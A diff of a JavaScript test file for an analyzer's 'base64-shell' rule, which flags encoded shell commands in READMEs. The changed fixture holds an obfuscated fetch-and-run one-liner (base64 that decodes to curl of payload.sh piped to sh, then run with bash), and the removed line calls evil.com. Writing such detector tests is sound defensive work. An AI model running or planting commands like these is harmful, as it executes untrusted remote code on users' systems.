@@ -217,9 +217,9 @@ describe("base64-shell rule", () => {
     assert.strictEqual(finding.severity, Severity.High);
   });
 
-  it("detects base64 with curl", () => {
+  it("detects encoded curl instructions passed into a shell", () => {
     const readme =
-      "curl http://evil.com/$(echo cGF5bG9hZCBkYXRhIHRoYXQgaXMgbG9uZyBhbmQgZW5jb2RlZA== | base64 -d)";
+      "echo 'Y3VybCBodHRwczovL2V4YW1wbGUuaW52YWxpZC9wYXlsb2FkLnNoIHwgc2g=' | base64 -d | bash";
     const report = analyzer.analyze(readme);
     const finding = report.findings.find(
       (f) => f.ruleId === "base64-shell",
